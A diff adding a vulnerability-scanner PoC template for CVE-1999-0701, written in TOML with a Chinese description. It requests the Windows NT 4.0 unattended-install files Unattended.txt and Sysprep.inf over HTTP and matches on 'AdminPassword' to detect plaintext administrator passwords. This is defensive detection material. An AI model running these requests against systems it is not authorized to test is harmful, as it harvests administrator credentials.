@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "检测 Windows NT 4.0 系统上是否存在无人值守安装后残留的敏感配置文件（Unattended.txt、Sysprep.inf），这些文件可能明文存储管理员密码"
+id = "POC-AVE-1999-0280"
+name = "Microsoft Windows NT 4.0 无人值守安装敏感信息泄露 PoC"
+severity = "high"
+tags = ["ave-1999-0280"]
+vuln_id = [
+    "CVE-1999-0701",
+    "AVE-1999-0280",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/winnt/system32/Unattended.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AdminPassword"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/winnt/system32/Sysprep.inf"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AdminPassword"]
